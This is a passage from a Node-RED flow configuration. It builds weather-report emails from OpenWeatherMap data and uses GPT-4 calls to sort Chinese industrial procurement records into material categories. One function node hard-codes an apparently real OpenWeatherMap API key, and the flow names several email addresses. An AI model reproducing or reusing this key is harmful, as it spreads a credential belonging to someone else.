        "func": "// // Parse the string to a JSON object\n// let data = msg.payload;\n\n// // Initialize the message string\n// let message = \"\";\n\n// // Check if necessary data is available\n// if (data.name && data.main && data.main.temp && data.wind && data.wind.speed) {\n//     let tempInKelvin = data.main.temp;\n//     let tempInCelsius = tempInKelvin - 273.15;\n//     let cityName = data.name;\n//     let windSpeed = data.wind.speed;\n\n//     // Construct the message\n//     message = `${cityName} today is ${tempInCelsius.toFixed(2)} ℃, wind speed: ${windSpeed.toFixed(2)} m/s`;\n// } else {\n//     // Handle the case where some data is not defined\n//     message = \"Complete weather data not available\";\n// }\n\n// // Set the message to payload\n// msg.payload = message;\n\n// return msg;\n// Parse the string to a JSON object\n// let data = msg.payload;\n\n// // Initialize the message string\n// let message = \"\";\n\n// // Check if necessary data is available\n// if (data.name && data.main && data.main.temp && data.wind && data.wind.speed) {\n//     let tempInKelvin = data.main.temp;\n//     let tempInCelsius = tempInKelvin - 273.15;\n//     let cityName = data.name;\n//     let windSpeed = data.wind.speed;\n\n//     // Construct the message\n//     message = `${cityName} today is ${tempInCelsius.toFixed(2)} ℃, wind speed: ${windSpeed.toFixed(2)} m/s`;\n// } else {\n//     // Handle the case where some data is not defined\n//     message = \"Complete weather data not available\";\n// }\n\n// // Set the message to payload for email\n// // msg.payload = {\n// //     text: message\n// // };\n// msg.payload = message;\n// msg.topic = \"这是一个天气预报邮件\";\n// msg.from = \"supOS天气服务 <458744713@qq.com>\";\n// msg.to = \"supOS天气服务 <renzhanxiang@freezonex.io>,supOS天气服务 <458744713@qq.com>\";  // 收件人\n// // msg.cc = \"458744713@qq.com\";  // 抄送\n// // msg.bcc = \"458744713@qq.com\";  // 密送\n// return msg;\nlet data = msg.payload;\n\n// Initialize the message string\nlet message = \"\";\n\n// Check if necessary data is available\nif (data.name && data.main && data.main.temp && data.wind && data.wind.speed) {\n    let tempInKelvin = data.main.temp;\n    let tempInCelsius = tempInKelvin - 273.15;\n    let cityName = data.name;\n    let windSpeed = data.wind.speed;\n\n    // Check if temperature is less than 25 degrees Celsius\n    if (tempInCelsius < 30) {\n        // Construct the message\n        message = `${cityName} today is ${tempInCelsius.toFixed(2)} ℃, wind speed: ${windSpeed.toFixed(2)} m/s`;\n\n        // Set the message to payload for email\n        msg.payload = message;\n        msg.topic = \"这是一个天气预报邮件\";\n        msg.from = \"supOS天气服务 <458744713@qq.com>\";\n        // msg.to = \"supOS天气服务 <renzhanxiang@freezonex.io>\";  // 收件人\n        // msg.cc = \"458744713@qq.com\";  // 抄送\n        // msg.bcc = \"458744713@qq.com\";  // 密送\n    } else {\n        // Do not send an email if temperature is 25 degrees or higher\n        return null;\n    }\n} else {\n    // Handle the case where some data is not defined\n    message = \"Complete weather data not available\";\n    // Optionally, handle this case as required (e.g., log a message)\n}\n\nreturn msg;\n",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 710,
        "y": 360,
        "wires": [
            [
                "1171cd219c130371",
                "399d64acc889b213"
            ]
        ]
    },
    {
        "id": "1171cd219c130371",
        "type": "debug",
        "z": "b94ab84a0cc55a32",
        "name": "debug 49",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 900,
        "y": 360,
        "wires": []
    },
    {
        "id": "31199657579e73c0",
        "type": "json",
        "z": "b94ab84a0cc55a32",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 550,
        "y": 360,
        "wires": [
            [
                "ca37aed38debc67c"
            ]
        ]
    },
    {
        "id": "399d64acc889b213",
        "type": "e-mail",
        "z": "b94ab84a0cc55a32",
        "server": "smtp.qq.com",
        "port": "465",
        "authtype": "BASIC",
        "saslformat": true,
        "token": "oauth2Response.access_token",
        "secure": true,
        "tls": true,
        "name": "1239380544@qq.com",
        "dname": "",
        "x": 760,
        "y": 440,
        "wires": []
    },
    {
        "id": "e4b1e640679219f8",
        "type": "function-gpt",
        "z": "b94ab84a0cc55a32",
        "name": "function-gpt 15",
        "config": "7bc909f23547b29f",
        "func": "//$PROMPT: Check the current weather in Hangzhou\n\n// Note: For this kind of function we would need to make a http request to a weather API such as openweathermap, but require() is not allowed based on the instructions.\nlet api_url = \"http://api.openweathermap.org/data/2.5/weather\";  // The API URL\nlet city = \"Hangzhou\";                                             // The city \nlet api_key = \"52b0b4f1827f51c0426ad2b1c2d3e354\";                                      // Your api key\nmsg.url = `${api_url}?q=${city}&appid=${api_key}`;                 // Build the url\n\nreturn msg;\n\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "//$PROMPT: 我想获得杭州天气\n\n// Set the API URL\nconst apiUrl = `http://api.weatherstack.com/current?access_key=YOUR_WEATHERSTACK_API_KEY&query=Hangzhou`;\n\n// Use the built-in HTTP Request node in Node-RED to build a simple flow that retrieves the weather of Hangzhou\nmsg.url = apiUrl;\n\nreturn msg;\n\n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 700,
        "y": 180,
        "wires": [
            [
                "4d4cacd480032dd8"
            ]
        ]
    },
    {
        "id": "8048d905d5255f74",
        "type": "inject",
        "z": "b94ab84a0cc55a32",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 490,
        "y": 180,
        "wires": [
            [
                "e4b1e640679219f8"
            ]
        ]
    },
    {
        "id": "4d4cacd480032dd8",
        "type": "debug",
        "z": "b94ab84a0cc55a32",
        "name": "debug 69",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 900,
        "y": 180,
        "wires": []
    },
    {
        "id": "186cc0a6c4071443",
        "type": "http request",
        "z": "a29fcfb6f0cac7dd",
        "name": "GPT",
        "method": "POST",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "https://api.openai.com/v1/chat/completions",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "bearer",
        "senderr": false,
        "headers": [
            {
                "keyType": "Content-Type",
                "keyValue": "",
                "valueType": "application/json",
                "valueValue": ""
            }
        ],
        "x": 490,
        "y": 240,
        "wires": [
            [
                "e699c0c1bc5feb51"
            ]
        ]
    },
    {
        "id": "e699c0c1bc5feb51",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 3",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 640,
        "y": 240,
        "wires": []
    },
    {
        "id": "c5fe0097d4e2fda5",
        "type": "json",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 150,
        "y": 240,
        "wires": [
            [
                "711a5afc1a3ca67f"
            ]
        ]
    },
    {
        "id": "711a5afc1a3ca67f",
        "type": "function-gpt",
        "z": "a29fcfb6f0cac7dd",
        "name": "function-gpt 3",
        "config": "44c9c8af11a9f982",
        "func": "// 确保msg.payload是可以迭代的\nif (msg.payload && typeof msg.payload === 'object' && !Array.isArray(msg.payload)) {\n    // 如果msg.payload是对象，则取其值作为数组\n    msg.payload = Object.values(msg.payload);\n} else if (!Array.isArray(msg.payload)) {\n    // 如果msg.payload不是对象也不是数组，则将其放入数组中\n    msg.payload = [msg.payload];\n}\n\n// 使用.map方法生成新的消息数组\nlet messagesToSend = msg.payload.map(value => {\n    return {\n        payload: {\n            model: \"gpt-4\",\n            messages: [{\n                role: 'user',\n                content: '尝试理解以下一级类目的含义和特点，括号中的是解释：工业检测,实验室产品,安防消防,电线电缆,电工器材,配电及控制元件,工业自动化,工具,照明,办公用品,通信设备,劳动防护,清洁用品及设备,控制系统,现场仪表,计算机及外设,盘装仪表,机械,工具耗材,存储,量具,焊接,刀具,搬运,紧固,密封,制冷|暖通|通风除尘,包材,胶粘,润滑,车间化学品,泵管阀,工位,建筑材料,轴承。综合我输入的JSON信息，那将是包含一些工业用产品物料的信息，然后根据你的综合理解，推测它最可能属于哪一个一级类目，要按照物品本身的属性推测，而不要依据使用场景或其所属系统分类。如果你很不确定属于哪类，则分为“人工”类。最终输出item描述和对应类别的JSON，你给我的回答应该只包括最后的JSON，以下是我的输入JSON:'+ value\n            }]\n        }\n    };\n});\n\n// 将要发送的消息数组存储在流的上下文中，以便跨消息调用持久化\nflow.set(\"messagesToSend\", messagesToSend);\n\n// 调用发送函数\nsendNext();\n\n// 定义发送函数\nfunction sendNext() {\n    let messages = flow.get(\"messagesToSend\") || [];\n    let nextMessage = messages.shift(); // 获取数组中的下一条消息\n    flow.set(\"messagesToSend\", messages); // 更新剩余消息数组\n    if (nextMessage) {\n        node.send(nextMessage); // 发送消息\n        // 如果还有消息要发送，调用此函数来延迟下一次发送\n        if (messages.length > 0) {\n            setTimeout(sendNext, 5000); // 5秒后再次发送\n        }\n    }\n}\n\nreturn null; // 防止在输出中直接发送任何消息\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "// 部署节点后，此处添加的代码将运行一次。 \n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 320,
        "y": 240,
        "wires": [
            [
                "186cc0a6c4071443"
            ]
        ]
    },
    {
        "id": "9e86e17f343739c6",
        "type": "inject",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "props": [
            {
                "p": "payload"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"到货日期\":\"2023-03-21T00:00:00.000Z\",\"采购订单号\":4500018770,\"采购行项目\":50,\"物料编码\":\"WL0708000000003100237\",\"物料描述\":\"\\\"\\n电排  KCS-100A\\n\\\"\",\"备注\":\"由诺圣设备维保，空气干燥机专用配件，现因故障没有运行，气动阀生产影响严重。\",\"到货基本计量单位\":\"个\",\"采购订单含税单价\":1120}",
        "payloadType": "json",
        "x": 170,
        "y": 180,
        "wires": [
            [
                "c5fe0097d4e2fda5"
            ]
        ]
    },
    {
        "id": "6d2c12f301a352b3",
        "type": "http request",
        "z": "a29fcfb6f0cac7dd",
        "name": "GPT",
        "method": "POST",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "https://api.openai.com/v1/chat/completions",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "bearer",
        "senderr": false,
        "headers": [
            {
                "keyType": "Content-Type",
                "keyValue": "",
                "valueType": "application/json",
                "valueValue": ""
            }
        ],
        "x": 170,
        "y": 440,
        "wires": [
            [
                "6a7c4c9307a1b2c5"
            ]
        ]
    },
    {
        "id": "eae6236441e8c196",
        "type": "function-gpt",
        "z": "a29fcfb6f0cac7dd",
        "name": "function-gpt 4",
        "config": "44c9c8af11a9f982",
        "func": "// 确保msg.payload是可以迭代的\nif (msg.payload && typeof msg.payload === 'object' && !Array.isArray(msg.payload)) {\n    // 如果msg.payload是对象，则取其值作为数组\n    msg.payload = Object.values(msg.payload);\n} else if (!Array.isArray(msg.payload)) {\n    // 如果msg.payload不是对象也不是数组，则将其放入数组中\n    msg.payload = [msg.payload];\n}\n\n// 使用.map方法生成新的消息数组\nlet messagesToSend = msg.payload.map(value => {\n    return {\n        payload: {\n            model: \"gpt-4\",\n            messages: [{\n                role: 'user',\n                content:\n                 '尝试理解以下一级类目的含义和特点，括号中的是解释：工业检测,实验室产品,安防消防,电线电缆,电工器材,配电及控制元件,工业自动化,工具,照明,办公用品,通信设备,劳动防护,清洁用品及设备,控制系统,现场仪表,计算机及外设,盘装仪表,机械,工具耗材,存储,量具,焊接,刀具,搬运,紧固,密封,制冷|暖通|通风除尘,包材,胶粘,润滑,车间化学品,泵管阀,工位,建筑材料,轴承。综合我输入的JSON信息，那将是包含一些工业用产品物料的信息，然后根据你的综合理解，推测它最可能属于哪一个一级类目，要按照物品本身的属性推测，而不要依据使用场景或其所属系统分类。如果你很不确定属于哪类，则分为“人工”类。最终输出item描述和对应类别的JSON，格式遵循\"物料名称:,一级类目：“，你给我的回答应该只包括最后的JSON，以下是我的输入JSON:' + value\n            }]\n        }\n    };\n});\n\n// 将要发送的消息数组存储在流的上下文中，以便跨消息调用持久化\nflow.set(\"messagesToSend\", messagesToSend);\n\n// 调用发送函数\nsendNext();\n\n// 定义发送函数\nfunction sendNext() {\n    let messages = flow.get(\"messagesToSend\") || [];\n    let nextMessage = messages.shift(); // 获取数组中的下一条消息\n    flow.set(\"messagesToSend\", messages); // 更新剩余消息数组\n    if (nextMessage) {\n        node.send(nextMessage); // 发送消息\n        // 如果还有消息要发送，调用此函数来延迟下一次发送\n        if (messages.length > 0) {\n            setTimeout(sendNext, 5000); // 5秒后再次发送\n        }\n    }\n}\n\nreturn null; // 防止在输出中直接发送任何消息\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "// 部署节点后，此处添加的代码将运行一次。 \n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 960,
        "y": 380,
        "wires": [
            [
                "6d2c12f301a352b3"
            ]
        ]
    },
    {
        "id": "3a25652341b2eb9c",
        "type": "inject",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "props": [
            {
                "p": "payload"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "[  {     \"到货日期\": \"2023-07-24T00:00:00.000Z\",     \"采购订单号\": 4500022829,     \"采购行项目\": 30,     \"物料编码\": \"WL1002001000003120001\",     \"物料描述\": \"2205不锈钢管 Φ57×3.5\",     \"备注\": \"3、4#浆液管回流管处更换\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 49.5   },   {     \"到货日期\": \"2022-11-29T00:00:00.000Z\",     \"采购订单号\": 4500016063,     \"采购行项目\": 10,     \"物料编码\": \"WL1002001000003100054\",     \"物料描述\": \"2205不锈钢管 φ76×4\",     \"备注\": \"3、4#进口烟道事故喷淋\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 49   },   {     \"到货日期\": \"2022-04-20T00:00:00.000Z\",     \"采购订单号\": 4500009675,     \"采购行项目\": 10,     \"物料编码\": \"WL1002001000003100035\",     \"物料描述\": \"2205不锈钢焊管57\",     \"备注\": null,     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 41.3   },   {     \"到货日期\": \"2022-04-20T00:00:00.000Z\",     \"采购订单号\": 4500009675,     \"采购行项目\": 20,     \"物料编码\": \"WL1002001000003100026\",     \"物料描述\": \"2205不锈钢焊管89X4\",     \"备注\": null,     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 41.8   },   {     \"到货日期\": \"2023-08-21T00:00:00.000Z\",     \"采购订单号\": 4500023965,     \"采购行项目\": 10,     \"物料编码\": \"WL1201001002013100177\",     \"物料描述\": \"2205不锈钢六角螺栓14x120\",     \"备注\": \"返料螺输用\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 25.61   },   {     \"到货日期\": \"2022-07-17T00:00:00.000Z\",     \"采购订单号\": 4500012929,     \"采购行项目\": 60,     \"物料编码\": \"WL1201002002003100022\",     \"物料描述\": \"2205不锈钢螺帽M12\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 2.8   },   {     \"到货日期\": \"2022-07-17T00:00:00.000Z\",     \"采购订单号\": 4500012929,     \"采购行项目\": 70,     \"物料编码\": \"WL1201001002013100128\",     \"物料描述\": \"2205不锈钢螺栓12x45\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 6.6   },   {     \"到货日期\": \"2022-09-29T00:00:00.000Z\",     \"采购订单号\": 4500014776,     \"采购行项目\": 150,     \"物料编码\": \"WL1201001002013100142\",     \"物料描述\": \"2205不锈钢螺栓16X70\",     \"备注\": \"带螺母\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 15.8   },   {     \"到货日期\": \"2022-09-29T00:00:00.000Z\",     \"采购订单号\": 4500014776,     \"采购行项目\": 160,     \"物料编码\": \"WL1201001002013100143\",     \"物料描述\": \"2205不锈钢螺栓16X80\",     \"备注\": \"带螺母\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 16.5   },   {     \"到货日期\": \"2021-11-19T00:00:00.000Z\",     \"采购订单号\": 4500004391,     \"采购行项目\": 20,     \"物料编码\": \"WL1201001002013100171\",     \"物料描述\": \"2205不锈钢螺栓M12X50mm\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 8.6   },   {     \"到货日期\": \"2022-09-29T00:00:00.000Z\",     \"采购订单号\": 4500014776,     \"采购行项目\": 170,     \"物料编码\": \"WL1201001002013100172\",     \"物料描述\": \"2205不锈钢螺栓M16X90mm\",     \"备注\": \"带螺母\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 17.6   },   {     \"到货日期\": \"2022-10-25T00:00:00.000Z\",     \"采购订单号\": 4500015636,     \"采购行项目\": 10,     \"物料编码\": \"WL1201001002043100011\",     \"物料描述\": \"2205不锈钢双头螺栓  M20×350\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 73.8   },   {     \"到货日期\": \"2022-04-26T00:00:00.000Z\",     \"采购订单号\": 4500010028,     \"采购行项目\": 30,     \"物料编码\": \"WL1105004000003100009\",     \"物料描述\": \"2205不锈钢弯头DN100\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 960   },   {     \"到货日期\": \"2022-04-26T00:00:00.000Z\",     \"采购订单号\": 4500010028,     \"采购行项目\": 10,     \"物料编码\": \"WL1105004000003100003\",     \"物料描述\": \"2205不锈钢弯头DN25\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 95   },   {     \"到货日期\": \"2023-06-15T00:00:00.000Z\",     \"采购订单号\": 4500021861,     \"采购行项目\": 20,     \"物料编码\": \"WL1105004000003100011\",     \"物料描述\": \"2205不锈钢弯头DN50\",     \"备注\": \"备件\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 66   },   {     \"到货日期\": \"2022-10-08T00:00:00.000Z\",     \"采购订单号\": 4500015215,     \"采购行项目\": 70,     \"物料编码\": \"WL1105004000003100005\",     \"物料描述\": \"2205不锈钢弯头DN65\",     \"备注\": \"库存备用\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 260   },   {     \"到货日期\": \"2022-04-26T00:00:00.000Z\",     \"采购订单号\": 4500010028,     \"采购行项目\": 20,     \"物料编码\": \"WL1105004000003100012\",     \"物料描述\": \"2205不锈钢弯头DN80\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 430   },   {     \"到货日期\": \"2022-12-26T00:00:00.000Z\",     \"采购订单号\": 4500016521,     \"采购行项目\": 10,     \"物料编码\": \"WL0901001000003100063\",     \"物料描述\": \"2205热电阻LDWZPKF-430205IT  2205  DN25 350X\",     \"备注\": \"耐腐防震热电阻，LDWZPKF-430205IT,PT100,2205,L=350×250,DN25\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 976   },   {     \"到货日期\": \"2022-04-20T00:00:00.000Z\",     \"采购订单号\": 4500009675,     \"采购行项目\": 30,     \"物料编码\": \"WL1001002000003100001\",     \"物料描述\": \"2205双相不锈钢板S=10MM\",     \"备注\": \"单块面积1.5m*3m\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 34.3   },   {     \"到货日期\": \"2022-04-21T00:00:00.000Z\",     \"采购订单号\": 4500007324,     \"采购行项目\": 20,     \"物料编码\": null,     \"物料描述\": \"2209预热器上管箱\",     \"备注\": \"在确定供应商后，可联系采购申请人提供相关参数及其他数据。上管箱材质为2205不锈钢材质。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 80000   },   {     \"到货日期\": \"2023-04-10T00:00:00.000Z\",     \"采购订单号\": 4500016991,     \"采购行项目\": 10,     \"物料编码\": null,     \"物料描述\": \"2211预热器上封头 EHA900X8(图号)\",     \"备注\": \"2组罐211预热器上封头/2205材质\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 85400   },   {     \"到货日期\": \"2023-04-10T00:00:00.000Z\",     \"采购订单号\": 4500016991,     \"采购行项目\": 20,     \"物料编码\": null,     \"物料描述\": \"2213预热器上封头 EHA700X8(图号)\",     \"备注\": \"2组罐213预热器上封头/2205材质\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 73200   },   {     \"到货日期\": \"2022-04-21T00:00:00.000Z\",     \"采购订单号\": 4500007324,     \"采购行项目\": 10,     \"物料编码\": null,     \"物料描述\": \"2214预热器\",     \"备注\": \"整体设备的1/4部分，主要材质为TA10/Q345R\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 136000   },   {     \"到货日期\": \"2023-07-18T00:00:00.000Z\",     \"采购订单号\": 4500023102,     \"采购行项目\": 10,     \"物料编码\": \"WL1202001002003100461\",     \"物料描述\": \"24套筒子加长\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 61   },   {     \"到货日期\": \"2023-07-04T00:00:00.000Z\",     \"采购订单号\": 4500019862,     \"采购行项目\": 10,     \"物料编码\": \"WL1101004000003100076\",     \"物料描述\": \"2507不锈钢球阀DN50 PN16\",     \"备注\": \"（试用）厂家：博雷控制系统有限公司，预热器酸洗管进口球阀（安装一年内出现本体泄漏问题，厂家免费更换）\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 5400   },   {     \"到货日期\": \"2023-05-10T00:00:00.000Z\",     \"采购订单号\": 4500020641,     \"采购行项目\": 10,     \"物料编码\": null,     \"物料描述\": \"2组罐401、402散热片保温衣，厚度5cm\",     \"备注\": \"建议河北中能环、干燥机用此品牌保温衣\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 2287.12   },   {     \"到货日期\": \"2022-07-29T00:00:00.000Z\",     \"采购订单号\": 4500012956,     \"采购行项目\": 40,     \"物料编码\": \"WL0740000000003100117\",     \"物料描述\": \"3#锅炉返料风风帽，附图：2383.702.1\",     \"备注\": \"济南锅炉\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 110.01   },   {     \"到货日期\": \"2022-03-02T00:00:00.000Z\",     \"采购订单号\": 4500005214,     \"采购行项目\": 20,     \"物料编码\": \"WL0740000000003100111\",     \"物料描述\": \"3#锅炉风帽导管  附图(G2383.702.1-2)\",     \"备注\": \"济南锅炉\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 123.99   },   {     \"到货日期\": \"2022-03-02T00:00:00.000Z\",     \"采购订单号\": 4500005214,     \"采购行项目\": 10,     \"物料编码\": \"WL0740000000003100102\",     \"物料描述\": \"3#锅炉炉床风帽附图（G2383.702.1-1)\",     \"备注\": \"济南锅炉\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 210   },   {     \"到货日期\": \"2022-03-02T00:00:00.000Z\",     \"采购订单号\": 4500007815,     \"采购行项目\": 20,     \"物料编码\": \"WL0740000000003100110\",     \"物料描述\": \"3#锅炉水冷壁让管\",     \"备注\": \"四川亚丰\",     \"到货基本计量单位\": \"件\",     \"采购订单含税单价\": 4125   },   {     \"到货日期\": \"2022-07-29T00:00:00.000Z\",     \"采购订单号\": 4500012956,     \"采购行项目\": 30,     \"物料编码\": \"WL0740000000003100116\",     \"物料描述\": \"3#锅炉松动风风帽，附图：2383.702.2\",     \"备注\": \"济南锅炉\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 110.01   },   {     \"到货日期\": \"2022-06-13T00:00:00.000Z\",     \"采购订单号\": 4500008097,     \"采购行项目\": 10,     \"物料编码\": \"WL1202001002003100388\",     \"物料描述\": \"3#炉氨水喷枪YFPQ-6/50\",     \"备注\": \"厂家：四川亚丰电力工程技术有限公司。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 5000   },   {     \"到货日期\": \"2022-10-18T00:00:00.000Z\",     \"采购订单号\": 4500014122,     \"采购行项目\": 50,     \"物料编码\": null,     \"物料描述\": \"3#炉二次风机调节风门\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 122180   },   {     \"到货日期\": \"2022-10-18T00:00:00.000Z\",     \"采购订单号\": 4500014122,     \"采购行项目\": 40,     \"物料编码\": null,     \"物料描述\": \"3#炉二次风机消音器\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 193640   } ]",
        "payloadType": "json",
        "x": 150,
        "y": 380,
        "wires": [
            [
                "8ec00784fb9c2359"
            ]
        ]
    },
    {
        "id": "f92e6722fe397686",
        "type": "function-gpt",
        "z": "a29fcfb6f0cac7dd",
        "name": "function-gpt 5",
        "config": "44c9c8af11a9f982",
        "func": "//$PROMPT: {\"物料描述\": \"电排  KCS-100A\", \"物料类别\": \"电工器材\"}  获取上面这个json中的物料描述\n\n// Get the payload where the JSON is located\nconst payload = msg.payload;\n\n// Access and store the value of the \"物料描述\" key in the JSON object\nlet materialDescription = payload[\"物料描述\"];\n\n// Add the material description to the msg object\nmsg.materialDescription = materialDescription;\n\nreturn msg;\n\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "// 部署节点后，此处添加的代码将运行一次。 \n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 640,
        "y": 780,
        "wires": [
            []
        ]
    },
    {
        "id": "b5202a42ab5844a5",
        "type": "json",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 810,
        "y": 380,
        "wires": [
            [
                "eae6236441e8c196"
            ]
        ]
    },
    {
        "id": "fa15403fdf5fc5ad",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 7",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "origin",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 740,
        "y": 80,
        "wires": []
    },
    {
        "id": "e9714b620db1d873",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 2",
        "func": "var temp =flow.get('origin')\nmsg.origin = temp\n\nmsg.origin = temp[msg.loop.index]\nflow.set(\"temp\",msg.origin)\n\nreturn msg",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 680,
        "y": 340,
        "wires": [
            []
        ]
    },
    {
        "id": "391868047aa620e2",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 1",
        "func": "\n// msg.payload=flow.get('payload')\nmsg.origin = flow.get('temp')\n\nvar jsonObj\nvar temp\n// try {\njsonObj = JSON.parse(msg.payload);\nmsg.temp = jsonObj.choices[0].message.content\n\n\n\nvar jsonObjTemp = JSON.parse(msg.temp);\n\nif (jsonObjTemp[\"类别\"] != null) {\n    temp = jsonObjTemp[\"类别\"]\n} else if (jsonObjTemp.category != null) {\n    temp = jsonObjTemp.category\n} else if (jsonObjTemp[\"一级类目\"] != null) {\n    temp = jsonObjTemp[\"一级类目\"]\n} else if (jsonObjTemp[\"物料类别\"] != null) {\n    temp = jsonObjTemp[\"物料类别\"]\n}\n\n\n\n// } \n// catch (error) {\n// }\nif (temp != undefined) {\n    msg.msg = temp\n\n}\nif (msg.origin != null && msg.origin != undefined) {\n    //  var jsonTmep = JSON.parse(msg.origin);\n    var jsonTmep = msg.origin;\n\n    jsonTmep[\"类别\"] = msg.msg\n\n    msg.origin = jsonTmep\n    // msg.temp = flow.get('loop')['enumeration'].length\nif (flow.get('loop').index != 0){\n    msg.result = flow.get('result') + ',' + JSON.stringify(msg.origin);\n    flow.set('result', msg.result)\n\n}else{\n    flow.set('result', JSON.stringify(msg.origin))\n}\n\n    if (flow.get('loop')['index'] === flow.get('loop')['enumeration'].length-1){\n        msg.resultNew = JSON.parse('[' + flow.get('result') + ']');\n}\n\n    return msg;\n}\n\nreturn msg\n",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 520,
        "y": 440,
        "wires": [
            [
                "40da5c25898d2e06",
                "da59a760018fba13",
                "8ad4a9cbbb3582c8",
                "06bcd53fc01071b8"
            ]
        ]
    },
    {
        "id": "f80f4f4df026ea3d",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 3",
        "func": "msg.key = flow.get('origin')\nflow.set('loop',msg.loop)\n\nmsg.payload=msg.key[msg.loop.index]\n\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 680,
        "y": 380,
        "wires": [
            [
                "b5202a42ab5844a5"
            ]
        ]
    },
    {
        "id": "5dd097e5cfe18253",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 7",
        "func": "msg\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 350.66668701171875,
        "y": 847.3333740234375,
        "wires": [
            [
                "805d342f920109cb",
                "a84ba8a1069a61eb"
            ]
        ]
    },
    {
        "id": "d8d652db154c993a",
        "type": "inject",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
